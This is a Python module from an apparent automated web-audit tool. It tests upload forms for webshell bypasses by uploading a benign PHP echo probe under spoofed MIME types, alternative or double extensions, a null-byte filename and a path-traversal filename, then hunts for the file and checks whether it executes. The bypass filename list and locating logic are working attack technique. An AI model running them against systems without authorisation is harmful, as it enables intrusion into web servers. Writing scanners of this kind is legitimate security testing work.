"""
模块 4：Webshell 上传绕过与命令执行 (RCE) 验证
"""
import uuid
import urllib.parse
import re
from typing import Dict, Any, List, Optional, Set
from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate
from bs4 import BeautifulSoup

from web_audit.modules.base_module import BaseModule
from web_audit.core.requester import Requester
from web_audit.core.llm_factory import get_llm

class ExtractPathResult(BaseModel):
    extracted_path: Optional[str] = Field(
        description="从上传响应中提取出的相对路径或绝对URL。如果找不到路径则返回 null。",
        default=None
    )
    reason: str = Field(
        description="提取逻辑说明"
    )

PATH_EXTRACT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的安全工具助手。我刚在服务器上上传了一个名为 `{filename}` 的文件。
请从下面的 HTTP 响应体中（可能是 JSON 也可能是 HTML）寻找并提取出这个文件被存放在服务器上的最终路径。

注意：
1. 可能是一个直接的 URL (http://...)
2. 也可能是一个相对路径 (如 /uploads/shell.php, img/avatars/shell.jpg)
3. 或者是 JSON 字段中的路径，如 {{"status":"success", "path":"/uploads/123.php"}}`
4. 如果只返回了成功而没有路径，或者返回了失败，请返回 null。"""),
    ("human", """响应状态码: {status_code}
文件名: {filename}

【服务器响应内容】:
{response_body}

请提取保存路径。""")
])

class UnifiedUploadAuditModule(BaseModule):
    name = "unified_upload_audit"

    def __init__(self, requester: Requester):
        super().__init__(requester)
        llm = get_llm()
        self._chain = PATH_EXTRACT_PROMPT | llm.with_structured_output(ExtractPathResult)
        
        # PHP 探针：仅执行原生打印动作，用于安全、无害的漏洞探测
        self.webshell_content = b"<?php echo 'VULN_VERIFIED_MARKER_UPLOAD'; ?>"

        # 各种绕过策略的 payload 清单
        self.bypass_strategies = [
            {"name": "Direct PHP", "filename": "shell.php", "content_type": "application/x-httpd-php"},
            {"name": "MIME Spoofing", "filename": "shell.php", "content_type": "image/jpeg"},
            {"name": "Alternative Ext 1", "filename": "shell.php3", "content_type": "image/jpeg"},
            {"name": "Alternative Ext 2", "filename": "shell.phtml", "content_type": "image/jpeg"},
            {"name": "Alternative Ext 3", "filename": "shell.phar", "content_type": "image/jpeg"},
            {"name": "Case Variation", "filename": "shell.PhP", "content_type": "image/jpeg"},
            {"name": "Double Extension", "filename": "shell.jpg.php", "content_type": "image/jpeg"},
            {"name": "Null Byte Bypass", "filename": "shell.php%00.jpg", "content_type": "image/jpeg"},
            {"name": "Path Traversal", "filename": "../shell_traversal.php", "content_type": "application/x-httpd-php"},
        ]

    def _extract_all_links(self, html_content: str) -> Set[str]:
        """提取页面中所有可能的资源链接 (href, src, data-src等) 和正则匹配"""
        links = set()
        if not html_content:
            return links
        
        soup = BeautifulSoup(html_content, "html.parser")
        for tag in soup.find_all(True):
            for attr in ["src", "href", "data-src", "data-url", "data-file"]:
                link = tag.get(attr)
                if link and isinstance(link, str):
                    links.add(link)
                    
        # 正则提取页面中所有的类路径字符串作为补充
        import re
        # 匹配类似 /uploads/2023/xx.jpg 或 http://.../xx.php 的字符串
        pattern = r'[\'"](/[^ \'"<>\n]+\.[a-zA-Z0-9]+)[\'"]|[\'"](http[^\'"<>\n]+\.[a-zA-Z0-9]+)[\'"]'
        for match in re.findall(pattern, html_content):
            for m in match:
                if m: links.add(m)
                
        return links

    def _find_best_shell_path(self, before_links: Set[str], after_links: Set[str], original_filename: str) -> Optional[str]:
        """
        智能 DOM 差异对比：通过评分机制在新增链接中寻找最可能的 Webshell 路径
        """
        new_links = after_links - before_links
        if not new_links:
            return None

        best_path = None
        max_score = -1
        
        # 评分权重定义
        WEIGHT_FILENAME = 10  # 包含原始文件名
        WEIGHT_EXTENSION = 5  # 包含可执行后缀
        WEIGHT_DIR = 3        # 位于常见上传目录
        
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']

        for link in new_links:
            score = 0
            # 1. 检查是否包含原始文件名 (最强信号)
            if original_filename in link:
                score += WEIGHT_FILENAME
            
            # 2. 检查是否包含可执行后缀
            if any(ext in link.lower() for ext in shell_extensions):
                score += WEIGHT_EXTENSION
            
            # 3. 检查是否在常见上传目录中
            if any(ud in link.lower() for ud in upload_dirs):
                score += WEIGHT_DIR
            
            if score > max_score:
                max_score = score
                best_path = link
        
        # 只有得分大于 0 的才认为是有效路径
        return best_path if max_score > 0 else None

    def _find_fallback_shell_path(self, before_links: Set[str], after_links: Set[str], strat_name: str) -> Optional[str]:
        """
        宽松匹配：当服务器重命名了文件且去掉了 UUID 时，寻找任何新增的可疑扩展名文件
        """
        new_links = after_links - before_links
        if not new_links:
            return None
            
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']
        
        # 针对路径穿越测试，特别关注包含穿越序列的路径
        if strat_name == "Path Traversal":
            for link in new_links:
                if "../" in link or "..%2F" in link or "shell_traversal" in link:
                    return link
        
        for link in new_links:
            lower_link = link.lower()
            if any(ext in lower_link for ext in shell_extensions):
                # 优先返回位于上传目录下的
                if any(ud in lower_link for ud in upload_dirs):
                    return link
                    
        # 没找到带常见目录的，返回第一个匹配后缀的
        for link in new_links:
            if any(ext in link.lower() for ext in shell_extensions):
                return link
                
        # 终极兜底 (新增)：哪怕没有后缀，只要是落在常见目录下的新增链接，或者是动态路由格式的新增链接，就当作目标！
        import re
        for link in new_links:
            lower_link = link.lower()
            if any(ud in lower_link for ud in upload_dirs):
                return link
            
            # 匹配可能没后缀的动态路由图片，例如 /api/avatar/xxxx 或 /images/xxxx
            if re.search(r'/(api|avatar|image|img|file|download)/[a-zA-Z0-9_-]+$', lower_link):
                return link
                
        # 实在不行，如果有任意的新增链接，排除掉锚点和JS，就拿来试一试（避免漏网之鱼）
        for link in new_links:
            if not link.startswith('#') and not link.startswith('javascript:'):
                 return link

        return None

    def _send_upload(self, url, param, filename, content, content_type, data):
        """执行文件上传请求"""
        files = {param: (filename, content, content_type)}
        try:
            return self.requester.post(url, files=files, data=data)
        except Exception as e:
            print(f"        [-] 上传请求失败: {e}")
            return None

    def _verify_execution(self, url: str) -> (bool, str):
        """验证 PHP 代码是否被成功解析执行 (无害化探测)"""
        try:
            resp = self.requester.get(url)
            # 如果 marker 被原样输出，说明它是被当作文本或图片解析的（未执行）
            # 但如果我们的 marker 出现在了响应中，且没有前面的 `<?php` 标签，说明 PHP 引擎解析了它
            if resp and "VULN_VERIFIED_MARKER_UPLOAD" in resp.text:
                # 简单检查是否原样暴露了源码
                if "<?php" not in resp.text:
                    return True, "PHP code successfully parsed and executed (Benign Probe)"
        except Exception:
            pass
        return False, ""

    def run(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        result = self._base_result(url)
        upload_forms = (context or {}).get("upload_forms", [])
        
        if not upload_forms:
            result["summary"] = "上下文中没有提供任何上传端点信息"
            return result

        print(f"  [UploadExploit] 准备对 {len(upload_forms)} 个上传端点进行 Webshell 攻击测试...")

        for form in upload_forms:
            action_url = form.get("action_url")
            file_params = form.get("file_input_names", [])
            file_param = file_params[0] if file_params else "file"
            
            print(f"    → 攻击端点: {action_url} (字段: {file_param})")
            
            # 要观测的页面集合 (去重)
            source_page = form.get("found_on_page") or form.get("source_url") or action_url
            observation_pages = set([source_page, url, action_url])

            # 智能回推父级页面 (解决"新增用户"页面无法看到"用户列表"的问题)
            # 1. 如果 source_page 有查询参数 (比如 user_add.php?action=new)，尝试去掉参数
            if "?" in source_page:
                observation_pages.add(source_page.split("?")[0])
                
            # 2. 将爬虫发现此表单时的引用页 (referer_url) 加入
            if form.get("referer_url") and form.get("referer_url") != source_page:
                observation_pages.add(form.get("referer_url"))
                
            # 3. 动态 DOM 智能提取：从表单页自身的“返回”、“取消”、“列表”按钮中提取真实的父级页面！
            try:
                html_text = self.requester.get(source_page).text
                if html_text:
                    from bs4 import BeautifulSoup
                    import urllib.parse
                    soup = BeautifulSoup(html_text, "html.parser")
                    for a_tag in soup.find_all("a", href=True):
                        text = a_tag.get_text(strip=True).lower()
                        href = a_tag["href"]
                        # 如果a标签没有文字，检查它的 title 或 class
                        if not text:
                            text = (a_tag.get("title", "") + " " + " ".join(a_tag.get("class", []))).lower()
                        
                        # 启发式关键字：寻找退回列表页的按钮
                        if any(kw in text for kw in ["返回", "取消", "列表", "管理", "back", "cancel", "list", "manage", "return"]):
                            # 排除掉类似 javascript:history.back() 的无效链接
                            if href.startswith("javascript:") or href.startswith("#"):
                                continue
                            full_url = urllib.parse.urljoin(source_page, href)
                            # 过滤掉注销等可能影响会话的链接
                            if "logout" in full_url.lower() or "quit" in full_url.lower():
                                continue
                            observation_pages.add(full_url)
                            print(f"    [*] 从页面 DOM 按钮 '{text}' 中提取到疑似列表页: {full_url}")
            except Exception as e:
                pass

            observation_pages = list(observation_pages)
            # 限制观测页面的数量，避免快照过大或请求过多导致极速减慢（最多取前 10 个）
            if len(observation_pages) > 10:
                observation_pages = observation_pages[:10]
                
            print(f"    [*] 记录 DOM 基线，将观测以下页面: {observation_pages}")
            
            baseline_links = set()
            for obs_page in observation_pages:
                try:
                    html_text = self.requester.fetch_rendered_html(obs_page)
                    if html_text:
                        baseline_links.update(self._extract_all_links(html_text))
                except Exception:
                    pass

            for strategy in self.bypass_strategies:
                strat_name = strategy["name"]
                filename = f"{uuid.uuid4().hex[:6]}_{strategy['filename']}"
                content_type = strategy["content_type"]
                
                print(f"      [Strategy: {strat_name}] 尝试上传 {filename}...")
                
                # 准备表单其他字段
                form_data = {}
                try:
                    check_resp = self.requester.get(source_page)
                    if check_resp:
                        soup = BeautifulSoup(check_resp.text, "html.parser")
                        for f_tag in soup.find_all("form"):
                            if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
                                for inp in f_tag.find_all("input"):
                                    if inp.get("type", "text") != "file" and inp.get("name"):
                                        form_data[inp["name"]] = inp.get("value", "test_val")
                                break
                except Exception: pass

                # 1. 执行上传
                resp = self._send_upload(action_url, file_param, filename, self.webshell_content, content_type, form_data)
                if not resp: continue
                    
                # 2. 尝试从响应体直接提取 (LLM)
                path = None
                resp_text = resp.text.strip()
                if len(resp_text) >= 15 and ("/" in resp_text or "\\" in resp_text):
                    try:
                        extract_res = self._chain.invoke({
                            "filename": filename,
                            "status_code": resp.status_code,
                            "response_body": resp.text[:2000]
                        })
                        if extract_res and extract_res.extracted_path:
                            ep = extract_res.extracted_path
                            if "/" in ep or "." in ep: path = ep
                    except Exception: pass
                
                # 3. 智能多页面 DOM 差异对比 (核心改进)
                if not path:
                    print(f"        [*] 响应中未发现路径，启动多页面联合 DOM 差异分析...")
                    import time
                    time.sleep(0.5)  # 稍微等待服务器处理和缓存更新
                    
                    after_links = set()
                    
                    # 额外增加服务器重定向的最终页面 (如果上传接口做了 302 跳转回列表页)
                    if resp.url and resp.url not in observation_pages:
                        observation_pages.append(resp.url)
                        print(f"        [*] 捕获到表单提交重定向，追加观测页面: {resp.url}")
                        
                    print(f"        [*] DOM 对比目标页面集 (上传后): {observation_pages}")
                    
                    for obs_page in observation_pages:
                        try:
                            html_text = self.requester.fetch_rendered_html(obs_page)
                            if html_text:
                                after_links.update(self._extract_all_links(html_text))
                        except Exception as e:
                            print(f"        [-] DOM 分析失败 ({obs_page}): {e}")
                            
                    path = self._find_best_shell_path(baseline_links, after_links, filename)
                    if not path:
                        path = self._find_fallback_shell_path(baseline_links, after_links, strat_name)
                    if path:
                        print(f"        [+] 智能对比成功: 发现新增可疑资源 -> {path}")

                # 3.5 高级验证：Playwright 动态网络拦截 (SPA 兜底)
                if not path and form.get("referer_url"):
                    print(f"        [*] DOM 对比未发现路径，启动 Playwright 网络层拦截 (监听 {form.get('referer_url')})...")
                    network_urls = self.requester.fetch_network_resources(form.get("referer_url"))
                    if network_urls:
                        # 在所有收集到的网络请求中，寻找包含文件核心名称的 URL
                        core_name = filename.split("_", 1)[-1]
                        for net_url in network_urls:
                            if core_name in net_url:
                                path = net_url
                                print(f"        [+] 网络拦截成功: 发现携带 Payload 的请求 -> {path}")
                                break
                            
                        # 如果没有找到精确文件名，宽松匹配：查找包含危险后缀或常见上传目录的网络请求
                        if not path:
                            for net_url in network_urls:
                                lower_url = net_url.lower()
                                if any(ext in lower_url for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']):
                                    path = net_url
                                    print(f"        [+] 网络拦截宽松匹配成功: 发现新增危险请求 -> {path}")
                                    break
                                    
                # 4. 兜底：正则扫描响应体
                if not path:
                    try:
                        core_name = filename.split("_", 1)[-1]
                        match = re.search(r'[\'"]([^\'"]*' + re.escape(core_name) + r'[^\'"]*)[\'"]', resp.text)
                        if match: path = match.group(1)
                    except Exception: pass
                
                if not path:
                    print(f"        [-] 穷尽所有策略仍未能定位上传文件路径，跳过验证。")
                    continue
                    
                # 5. 验证落地或 RCE
                base_for_join = form.get("found_on_page") or action_url or url
                webshell_url = urllib.parse.urljoin(base_for_join, path)
                
                if strategy["name"] == "Path Traversal":
                    print(f"        [!] 正在验证路径穿越: {webshell_url}")
                    # 对于路径穿越，只要能访问到文件，就说明穿越成功
                    try:
                        verify_resp = self.requester.get(webshell_url)
                        if verify_resp and verify_resp.status_code == 200 and b"VULN_VERIFIED_MARKER_UPLOAD" in verify_resp.content:
                            print(f"        🚨🚨 成功绕过并造成路径穿越! 🚨🚨")
                            result["findings"].append({
                                "url": action_url,
                                "strategy": strat_name,
                                "payload_file": filename,
                                "shell_path": webshell_url,
                                "rce_output": "File uploaded via path traversal",
                                "severity": "High"
                            })
                            break
                    except Exception as e:
                        print(f"        [-] 路径穿越验证失败: {e}")
                else:
                    print(f"        [!] 正在验证漏洞 (无害化探针检测): {webshell_url}")
                    rce_success, cmd_output = self._verify_execution(webshell_url)
                    
                    if rce_success:
                        print(f"        🚨🚨 成功绕过! 策略 '{strat_name}' 允许代码执行! (PHP 解析器生效) 🚨🚨")
                        result["findings"].append({
                            "url": action_url,
                            "strategy": strat_name,
                            "payload_file": filename,
                            "shell_path": webshell_url,
                            "rce_output": cmd_output.strip(),
                            "severity": "Critical"
                        })
                        break # 只要一个策略成功即可

        return result